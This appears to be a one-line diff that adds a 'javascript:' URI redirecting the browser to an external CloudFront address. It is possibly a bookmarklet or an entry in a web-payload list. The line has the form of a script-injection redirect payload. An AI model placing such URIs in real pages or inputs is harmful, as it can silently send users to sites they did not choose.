@@ -1,0 +1,1 @@
+javascript:window.location.href='https://d1kusoubqqwr7w.cloudfront.net/';
